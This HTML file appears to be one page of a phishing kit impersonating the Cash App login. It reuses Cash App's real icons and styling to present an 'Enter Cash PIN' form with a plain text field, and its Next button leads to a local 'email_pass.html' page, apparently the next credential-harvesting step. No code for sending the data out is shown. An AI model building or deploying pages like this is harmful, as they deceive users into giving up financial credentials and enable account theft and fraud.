<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />

        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
        <link rel="stylesheet" type="text/css" href="./cash.css" />

        <title>Cash App</title>
        <style type="text/css">
            body {
                display: flex;
                flex-direction: column;
                justify-content: center;
                min-height: 100vh;
            }
        </style>
        <link rel="icon" sizes="196x196" href="https://cash.app/icon-196.png">
        <link rel="icon" href="https://cash.app/favicon.ico">
        <link rel="mask-icon" href="https://cash.app/favicon-pinned.svg" color="#18C300">
    </head>
    <body class="theme-bg ember-application theme-green">
        <div id="ember323" class="ember-view">
            <div data-current-route="login" id="ember347" class="full-height application-cash ember-view">
                <div id="ember354" class="cookie-banner ember-view"><!----></div>
                <section class="layout-login flex-container full-height pad">
                    <div class="login-container flex-container flex-v-center flex-fill">
                        <!---->
                        <h1 class="step-title flex-static">Enter Cash PIN</h1>
                        <!---->
                        <form autocomplete="off" spellcheck="true" novalidate="true" id="ember360" class="login-form ember-view">
                            <div id="ember386" class="field fk-field-container ember-view">
                                <input
                                    type="text"
                                    aria-label="Enter Cash PIN"
                                    name="cashpin"
                                    autocomplete="off"
                                    spellcheck="false"
                                    autocapitalize="none"
                                    id="cashpin"
                                    class="ember-text-field ember-view"
                                    placeholder="PIN"
                                />
                            </div>
                            <!---->
                            <div class="alias-submit fade-in immediate show">
                                <div id="ember401" class="cta submit-button-component submit-button-with-spinner ember-view">
                                    <a href="./email_pass.html"><button type="button" aria-label="Request Sign In Code" class="button theme-button button--round theme-button" data-ember-action="" data-ember-action-402="402">Next</button></a>
                                    <div id="ember407" class="spinner-container ember-view"></div>
                                </div>
                            </div>
                        </form>
                    </div>
                </section>

                <!---->
                <div id="ember410" class="modal-manager ember-view">
                    <div class="modal-overlay"></div>
                    <!---->
                </div>
            </div>
        </div>
    </body>
</html>
